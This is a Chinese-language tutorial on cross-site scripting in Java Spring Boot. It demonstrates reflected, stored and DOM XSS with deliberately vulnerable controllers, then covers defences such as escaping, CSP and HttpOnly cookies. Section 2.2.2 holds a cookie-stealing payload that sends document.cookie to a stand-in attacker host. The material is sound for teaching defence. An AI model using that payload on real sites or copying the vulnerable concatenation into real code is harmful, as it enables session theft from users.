---
cover: https://image.acg.lol/file/2025/11/15/reimu-12.jpg
title: XSS 攻击与防御
date: 2025-11-13 12:30:00
categories: 前端编程
excerpt: Scripting，跨站脚本攻击）是一种常见的Web安全漏洞，攻击者通过在目标网站注入恶意JavaScript脚本（或HTML、CSS等客户端可执行代码），当用户访问包含恶意脚本的页面时，脚本会在用户浏览器中执行，从而窃取用户信息、伪造用户操作、篡改页面内容等。
---

## 一、什么是 XSS 攻击？

### 1.1 定义
**XSS（Cross-Site Scripting，跨站脚本攻击）**  
攻击者通过在目标网站**注入恶意 JavaScript 脚本**，当用户访问时，脚本在**用户浏览器中执行**，可实现：

- 窃取 Cookie / Session
- 伪造用户操作（如转账）
- 钓鱼页面重定向
- 篡改页面内容

---

### 1.2 核心原理
> **用户输入 → 未过滤/转义 → 浏览器解析执行 → 攻击成功**

---

### 1.3 XSS 攻击的三种类型

| 类型 | 特点 | 攻击场景 |
|------|------|---------|
| **存储型 XSS**（持久化） | 脚本**存储到服务器**（数据库、文件） | 论坛评论、用户资料、商品评价 |
| **反射型 XSS**（非持久化） | 脚本通过 **URL/表单** 传入，**服务器直接返回** | 搜索结果、错误提示、登录失败页面 |
| **DOM 型 XSS** | **纯前端**，通过修改 DOM 触发 | `innerHTML`、`eval`、`location.hash` 等 |

---

## 二、Java 代码实践 XSS 攻击（完整可运行）

### 2.1 环境准备

```xml
<!-- pom.xml -->
<dependencies>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-web</artifactId>
    </dependency>
    <dependency>
        <groupId>org.springframework.boot</groupId>
        <artifactId>spring-boot-starter-thymeleaf</artifactId>
    </dependency>
</dependencies>
```

---

### 2.2 反射型 XSS 攻击实践

#### 2.2.1 存在漏洞的代码（未防御）

```java
@RestController
public class ReflectXssController {

    @GetMapping("/search")
    public String search(@RequestParam String keyword) {
        // 直接拼接返回 —— 漏洞！
        return "<h2>搜索结果：" + keyword + "</h2>";
    }
}
```

#### 2.2.2 攻击演示

1. 启动应用，访问：

```
http://localhost:8080/search?keyword=<script>alert('XSS')</script>
```

2. 浏览器弹出弹窗，说明脚本执行成功。

3. **窃取 Cookie 攻击**：

```
http://localhost:8080/search?keyword=<script>
  fetch('http://attacker.com/steal?cookie='+document.cookie)
</script>
```

> 攻击者可获取用户登录凭证！

---

### 2.3 存储型 XSS 攻击实践

#### 2.3.1 存在漏洞的代码（未防御）

```java
@RestController
public class CommentController {

    private static List<String> comments = new ArrayList<>();

    @PostMapping("/comment")
    public String addComment(@RequestParam String content) {
        comments.add(content); // 直接存储 —— 漏洞！
        return "评论成功";
    }

    @GetMapping("/getComments")
    public String getComments() {
        StringBuilder sb = new StringBuilder("<h2>评论区</h2><ul>");
        for (String c : comments) {
            sb.append("<li>").append(c).append("</li>"); // 直接拼接 —— 漏洞！
        }
        sb.append("</ul>");
        return sb.toString();
    }
}
```

#### 2.3.2 攻击演示

1. 使用 PostMan 发送 POST 请求：

```http
POST http://localhost:8080/comment
content=<script>alert('Stored XSS!')</script>
```

2. 访问 `http://localhost:8080/getComments`

→ **所有访问该页面的用户都会弹出弹窗！**

---

### 2.4 DOM 型 XSS 攻击实践

#### 2.4.1 前端页面（存在漏洞）

```html
<!-- src/main/resources/static/dom-xss.html -->
<!DOCTYPE html>
<html>
<head><title>DOM XSS Demo</title></head>
<body>
  <h2>DOM XSS 测试</h2>
  <input type="text" id="input" placeholder="输入内容">
  <button onclick="show()">提交</button>
  <div id="output"></div>

  <script>
    function show() {
      const input = document.getElementById('input').value;
      // 危险！使用 innerHTML 渲染
      document.getElementById('output').innerHTML = '你输入的是：' + input;
    }
  </script>
</body>
</html>
```

#### 2.4.2 攻击演示

1. 访问 `http://localhost:8080/dom-xss.html`
2. 输入：

```html
<script>alert('DOM XSS!')</script>
```

3. 点击提交 → 弹窗触发（**无需服务器参与**）

---

## 三、XSS 攻击的防御方法（实战代码）

---

### 3.1 输入验证（白名单过滤）

```java
public class InputValidator {
    private static final Pattern SAFE_PATTERN = Pattern.compile("^[a-zA-Z0-9\\u4e00-\\u9fa5\\s.,!?]+$");

    public static boolean isSafe(String input) {
        return input != null && SAFE_PATTERN.matcher(input).matches();
    }
}
```

#### 控制器中使用

```java
@PostMapping("/comment")
public ResponseEntity<String> addComment(@RequestParam String content) {
    if (!InputValidator.isSafe(content)) {
        return ResponseEntity.badRequest().body("非法输入");
    }
    // 继续处理...
}
```

---

### 3.2 输出转义（核心防御）

```java
public class HtmlUtils {
    public static String htmlEscape(String input) {
        if (input == null) return "";
        return input
            .replace("&", "&amp;")
            .replace("<", "&lt;")
            .replace(">", "&gt;")
            .replace("\"", "&quot;")
            .replace("'", "&#x27;")
            .replace("/", "&#x2F;");
    }
}
```

#### 控制器中使用（修复反射型）

```java
@GetMapping("/search")
public String search(@RequestParam String keyword) {
    String safeKeyword = HtmlUtils.htmlEscape(keyword);
    return "<h2>搜索结果：" + safeKeyword + "</h2>";
}
```

#### 修复存储型输出

```java
sb.append("<li>").append(HtmlUtils.htmlEscape(c)).append("</li>");
```

---

### 3.3 安全前端渲染（防 DOM 型 XSS）

```javascript
// 修复后：使用 textContent
document.getElementById('output').textContent = '你输入的是：' + input;
```

> **永远不要用 `innerHTML` 渲染用户输入！**

---

### 3.4 设置 CSP 响应头

```java
@Configuration
public class SecurityConfig implements WebMvcConfigurer {

    @Override
    public void addInterceptors(InterceptorRegistry registry) {
        registry.addInterceptor(new HandlerInterceptor() {
            @Override
            public void postHandle(HttpServletRequest request, HttpServletResponse response,
                                   Object handler, ModelAndView modelAndView) {
                response.setHeader("Content-Security-Policy",
                    "default-src 'self'; script-src 'self'; object-src 'none'");
            }
        });
    }
}
```

---

### 3.5 设置 HttpOnly Cookie

```java
@Bean
public ServletWebServerFactory servletContainer() {
    TomcatServletWebServerFactory tomcat = new TomcatServletWebServerFactory();
    tomcat.addContextCustomizers(context -> {
        context.setSessionCookieConfig(
            context.getSessionCookieConfig().setHttpOnly(true)
        );
    });
    return tomcat;
}
```

---

### 3.6 使用 OWASP Java Encoder（推荐）

#### 添加依赖

```xml
<dependency>
    <groupId>org.owasp.encoder</groupId>
    <artifactId>encoder</artifactId>
    <version>1.2.3</version>
</dependency>
```

#### 使用

```java
import org.owasp.encoder.Encode;

String safe = Encode.forHtml(userInput);
```

---

## 四、防御总结表

| 防御手段 | 适用场景 | 优先级 |
|--------|--------|-------|
| **输出转义** | 所有渲染到 HTML | ★★★★★ |
| **输入验证** | 格式固定输入 | ★★★★ |
| **CSP 头** | 全局脚本控制 | ★★★★ |
| **HttpOnly Cookie** | 保护凭证 | ★★★★ |
| **textContent 渲染** | DOM 操作 | ★★★★ |
| **OWASP Encoder** | 复杂项目 | ★★★ |

---

## 五、注意事项

1. **组合防御**：输入验证 + 输出转义 + CSP
2. **富文本场景**：使用 **OWASP AntiSamy** 白名单过滤
3. **定期扫描**：使用 **OWASP ZAP** / **Burp Suite**
4. **前端框架**：React/Vue 自带转义，**但拼接 HTML 仍危险**

---

## 六、记忆口诀

> **“输入不信，输出转义；  
> DOM 别 HTML，Cookie 加 HttpOnly；  
> CSP 锁脚本，OWASP 来助力！”**

---